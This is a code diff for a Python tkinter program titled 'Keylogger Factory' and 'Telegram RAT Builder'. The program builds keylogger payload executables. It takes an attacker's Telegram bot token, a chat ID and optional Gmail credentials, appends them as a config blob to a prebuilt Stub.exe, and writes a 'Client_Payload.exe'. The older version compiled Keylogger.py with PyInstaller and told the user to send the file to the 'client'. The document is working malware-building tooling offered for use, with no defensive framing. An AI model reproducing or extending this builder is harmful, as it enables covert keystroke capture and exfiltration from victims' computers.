@@ -1,131 +1,195 @@
 import tkinter as tk
-from tkinter import messagebox
+from tkinter import messagebox, filedialog
 import os
 import sys
 import shutil
 import threading
-import subprocess
+import json
+import time
 
-# Paths
-if getattr(sys, 'frozen', False):
-    BASE_DIR = os.path.dirname(sys.executable)
-else:
-    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+# Helper for PyInstaller bundled paths
+def resource_path(relative_path):
+    """ Get absolute path to resource, works for dev and for PyInstaller """
+    try:
+        # PyInstaller creates a temp folder and stores path in _MEIxxxxxx
+        base_path = sys._MEIPASS
+    except Exception:
+        base_path = os.path.abspath(".")
 
-SCRIPT_PATH = os.path.join(BASE_DIR, "Keylogger.py")
-TEMP_SCRIPT_NAME = "Temp_Payload.py"
-TEMP_SCRIPT_PATH = os.path.join(BASE_DIR, TEMP_SCRIPT_NAME)
+    return os.path.join(base_path, relative_path)
+
+# Stub is expected to be in the same folder during Dev, or bundled in distribution
+STUB_NAME = "Stub.exe"
+STUB_PATH = resource_path(os.path.join("dist", STUB_NAME)) if os.path.exists(os.path.join("dist", STUB_NAME)) else resource_path(STUB_NAME)
+OUTPUT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Generated_Payloads")
+
+CONFIG_DELIMITER = b"#####CONFIG#####"
 
 class ConfigBuilder:
     def __init__(self):
         self.root = tk.Tk()
-        self.root.title("Keylogger Configurator ⚙️")
-        self.root.geometry("450x250")
+        self.root.title("Keylogger Factory (Standalone) 🏭")
+        self.root.geometry("600x650")
         self.root.resizable(False, False)
         
-        # Title
-        tk.Label(self.root, text="🕵️ Client Payload Builder", font=("Segoe UI", 16, "bold")).pack(pady=15)
+        # Header
+        header = tk.Label(self.root, text="🕵️ Telegram RAT Builder", font=("Segoe UI", 18, "bold"))
+        header.pack(pady=10)
         
-        # Token Input
-        tk.Label(self.root, text="Enter Attacker Bot Token:", font=("Segoe UI", 10)).pack(anchor="w", padx=30)
-        self.token_entry = tk.Entry(self.root, width=50, font=("Consolas", 9))
-        self.token_entry.pack(pady=5, padx=30)
+        # --- Form Frame ---
+        form_frame = tk.Frame(self.root)
+        form_frame.pack(pady=5, padx=20, fill="x")
+
+        # 1. Bot Token
+        tk.Label(form_frame, text="Bot Token (Required):", font=("Segoe UI", 10, "bold")).grid(row=0, column=0, sticky="w", pady=5)
+        self.token_entry = tk.Entry(form_frame, width=40, font=("Consolas", 10))
+        self.token_entry.grid(row=0, column=1, pady=5, padx=5)
+
+        # 2. Chat ID
+        tk.Label(form_frame, text="Chat ID (Optional):", font=("Segoe UI", 10)).grid(row=1, column=0, sticky="w", pady=5)
+        self.chat_id_entry = tk.Entry(form_frame, width=40, font=("Consolas", 10))
+        self.chat_id_entry.grid(row=1, column=1, pady=5, padx=5)
         
-        # Build Button
-        self.build_btn = tk.Button(self.root, text="🔨 Build Client .EXE", command=self.start_build, 
-                                   bg="#D9534F", fg="white", font=("Segoe UI", 12, "bold"), height=2, width=30)
-        self.build_btn.pack(pady=20)
+        # 3. Output Filename
+        tk.Label(form_frame, text="Output Filename (.exe):", font=("Segoe UI", 10, "bold")).grid(row=2, column=0, sticky="w", pady=5)
+        self.filename_entry = tk.Entry(form_frame, width=40, font=("Consolas", 10))
+        self.filename_entry.insert(0, "Client_Payload.exe")
+        self.filename_entry.grid(row=2, column=1, pady=5, padx=5)
         
-        # Status
-        self.status = tk.Label(self.root, text="Ready to build.", fg="gray", font=("Segoe UI", 9))
-        self.status.pack(side=tk.BOTTOM, pady=10)
+        # --- Email Section ---
+        email_frame = tk.LabelFrame(self.root, text="📧 Email Configuration (Optional)", font=("Segoe UI", 10, "bold"), fg="#007BFF")
+        email_frame.pack(pady=10, padx=20, fill="x")
+
+        # Enable Checkbox
+        self.email_vars_visible = tk.BooleanVar(value=False)
+        self.email_check = tk.Checkbutton(email_frame, text="Enable Email Reporting", variable=self.email_vars_visible, command=self.toggle_email_fields, font=("Segoe UI", 9))
+        self.email_check.pack(anchor="w", padx=10, pady=2)
+
+        # Fields container
+        self.email_fields_frame = tk.Frame(email_frame)
+        self.email_fields_frame.pack(fill="x", padx=10, pady=5)
+
+        tk.Label(self.email_fields_frame, text="Gmail Address:", font=("Segoe UI", 9)).grid(row=0, column=0, sticky="w")
+        self.email_user_entry = tk.Entry(self.email_fields_frame, width=35, font=("Consolas", 9))
+        self.email_user_entry.grid(row=0, column=1, padx=5, pady=2)
+
+        tk.Label(self.email_fields_frame, text="App Password:", font=("Segoe UI", 9)).grid(row=1, column=0, sticky="w")
+        self.email_pass_entry = tk.Entry(self.email_fields_frame, width=35, font=("Consolas", 9), show="*")
+        self.email_pass_entry.grid(row=1, column=1, padx=5, pady=2)
+
+        tk.Label(self.email_fields_frame, text="Receiver Email:", font=("Segoe UI", 9)).grid(row=2, column=0, sticky="w")
+        self.email_to_entry = tk.Entry(self.email_fields_frame, width=35, font=("Consolas", 9))
+        self.email_to_entry.grid(row=2, column=1, padx=5, pady=2)
+
+        self.toggle_email_fields() # Initial State
+
+        # --- Build Button ---
+        self.build_btn = tk.Button(self.root, text="🔨 GENERATE PAYLOAD", command=self.start_build, 
+                                   bg="#007BFF", fg="white", font=("Segoe UI", 12, "bold"), height=2, width=35)
+        self.build_btn.pack(pady=15)
+        
+        # --- Status Area ---
+        self.status_label = tk.Label(self.root, text="Ready to build.", fg="gray", font=("Segoe UI", 9))
+        self.status_label.pack(side=tk.BOTTOM, pady=5)
+
+        # Create Output Dir
+        if not os.path.exists(OUTPUT_DIR):
+            os.makedirs(OUTPUT_DIR)
+
+    def toggle_email_fields(self):
+        state = "normal" if self.email_vars_visible.get() else "disabled"
+        self.email_user_entry.config(state=state)
+        self.email_pass_entry.config(state=state)
+        self.email_to_entry.config(state=state)
 
     def start_build(self):
+        # 1. Validate Inputs
         token = self.token_entry.get().strip()
+        filename = self.filename_entry.get().strip()
+        
         if not token:
             messagebox.showerror("Error", "Bot Token is required!")
             return
+        if not filename.endswith(".exe"):
+            filename += ".exe"
+            
+        # Email Info
+        email_data = {}
+        if self.email_vars_visible.get():
+            email_data["email_enabled"] = True
+            email_data["email_user"] = self.email_user_entry.get().strip()
+            email_data["email_pass"] = self.email_pass_entry.get().strip()
+            email_data["email_to"] = self.email_to_entry.get().strip()
+            if not all([email_data["email_user"], email_data["email_pass"], email_data["email_to"]]):
+                messagebox.showerror("Error", "All Email fields are required if Email Reporting is enabled.")
+                return
+        else:
+            email_data["email_enabled"] = False
+
+        # 2. Check Stub
+        # Just in case we are running dev mode and stub is in dist/
+        stub_check = STUB_PATH
+        if not os.path.exists(stub_check):
+            # Try looking in dist folder relative to script
+            stub_check = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dist", STUB_NAME)
         
-        # Check if Keylogger.py exists
-        if not os.path.exists(SCRIPT_PATH):
-             messagebox.showerror("Error", f"Keylogger.py not found!\nMake sure it is in the same folder as this Builder.\nPath: {SCRIPT_PATH}")
+        if not os.path.exists(stub_check):
+             messagebox.showerror("Error", f"Stub.exe not found!\nMake sure you have compiled the stub first.\nMissing: {stub_check}")
              return
 
-        self.build_btn.config(state=tk.DISABLED, text="Building... ⏳")
-        self.status.config(text="Injecting Token & Compiling...", fg="blue")
+        # 3. UI Update
+        self.build_btn.config(state=tk.DISABLED, text="Building... Please Wait ⏳", bg="#6c757d")
+        self.status_label.config(text="Processing...", fg="blue")
         
-        threading.Thread(target=self.run_build_process, args=(token,), daemon=True).start()
+        # 4. Start Thread
+        chat_id = self.chat_id_entry.get().strip()
+        threading.Thread(target=self.run_build_process, args=(token, chat_id, filename, email_data, stub_check), daemon=True).start()
 
-    def run_build_process(self, token):
+    def run_build_process(self, token, chat_id, filename, email_data, stub_path):
         try:
-            # 1. Read Template
-            with open(SCRIPT_PATH, "r", encoding="utf-8") as f:
-                content = f.read()
+            # A. Prepare Config Data
+            config_data = {
+                "bot_token": token,
+                "chat_id": chat_id,
+                **email_data
+            }
             
-            # 2. Inject Token
-            if "TOKEN_PLACEHOLDER" not in content:
-                self.fail_build("Error: Placeholder 'TOKEN_PLACEHOLDER' not found in Keylogger.py!")
-                return
-
-            new_content = content.replace("TOKEN_PLACEHOLDER", token)
+            json_str = json.dumps(config_data)
+            payload_bytes = CONFIG_DELIMITER + json_str.encode('utf-8')
             
-            # 3. Save Temp Script
-            with open(TEMP_SCRIPT_PATH, "w", encoding="utf-8") as f:
-                f.write(new_content)
+            # B. Read Stub Bytes
+            with open(stub_path, "rb") as f:
+                stub_content = f.read()
                 
-            # 4. Clean previous builds (DO NOT DELETE DIST, only build)
-            if os.path.exists(os.path.join(BASE_DIR, "build")):
-                shutil.rmtree(os.path.join(BASE_DIR, "build"))
+            # C. Combine Stub + Config
+            final_content = stub_content + payload_bytes
             
-            # Remove existing target file if it exists
-            target_exe = os.path.join(BASE_DIR, "dist", "Client_Payload.exe")
-            if os.path.exists(target_exe):
-                try:
-                    os.remove(target_exe)
-                except:
-                    pass # PyInstaller might fail later if it can't overwrite, but we tried.
-
-            # 5. Run PyInstaller
-            # Using --name "Client_Payload" to avoid conflict with "Keylogger"
-            cmd = [sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--name", "Client_Payload", TEMP_SCRIPT_PATH]
-            
-            process = subprocess.Popen(cmd, cwd=BASE_DIR, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-            stdout, stderr = process.communicate()
-            
-            # 6. Cleanup Temp Script
-            if os.path.exists(TEMP_SCRIPT_PATH):
-                os.remove(TEMP_SCRIPT_PATH)
+            # D. Write Output
+            target_path = os.path.join(OUTPUT_DIR, filename)
+            with open(target_path, "wb") as f:
+                f.write(final_content)
                 
-            if process.returncode == 0:
-                self.root.after(0, self.success_build)
-            else:
-                self.fail_build(f"PyInstaller Failed:\n{stderr}")
+            self.root.after(0, lambda: self.success_build(target_path))
 
         except Exception as e:
-            self.fail_build(f"Exception: {e}")
+            self.fail_build(f"Critical Error: {e}")
 
-    def success_build(self):
-        self.status.config(text="✅ Build Successful!", fg="green")
-        self.build_btn.config(state=tk.NORMAL, text="🔨 Build Client .EXE")
+    def success_build(self, exe_path):
+        self.status_label.config(text="✅ Build Completed Successfully!", fg="green")
+        self.build_btn.config(state=tk.NORMAL, text="🔨 GENERATE PAYLOAD", bg="#007BFF")
         
-        dist_path = os.path.join(BASE_DIR, "dist")
-        exe_path = os.path.join(dist_path, "Client_Payload.exe")
-        
-        messagebox.showinfo("Success", f"Payload Generated Successfully!\n\nLocation: {exe_path}\n\nYou can now send this file to the client.")
-        os.startfile(dist_path)
+        response = messagebox.askyesno("Success", f"Payload Generated!\n\nLocation: {exe_path}\n\nOpen output folder?")
+        if response:
+            os.startfile(os.path.dirname(exe_path))
 
     def fail_build(self, error_msg):
-        self.root.after(0, lambda: self._update_fail_ui(error_msg))
+        self.root.after(0, lambda: self._handle_fail(error_msg))
 
-    def _update_fail_ui(self, error_msg):
-        self.status.config(text="❌ Build Failed", fg="red")
-        self.build_btn.config(state=tk.NORMAL, text="🔨 Build Client .EXE")
-        print(error_msg) # Log to console
-        messagebox.showerror("Build Failed", "Check console for details.\n\n" + str(error_msg)[:200])
-
-    def run(self):
-        self.root.mainloop()
+    def _handle_fail(self, error_msg):
+        self.status_label.config(text="❌ Build Failed", fg="red")
+        self.build_btn.config(state=tk.NORMAL, text="🔨 GENERATE PAYLOAD", bg="#007BFF")
+        messagebox.showerror("Error", error_msg)
 
 if __name__ == "__main__":
     app = ConfigBuilder()
-    app.run()
+    app.root.mainloop()
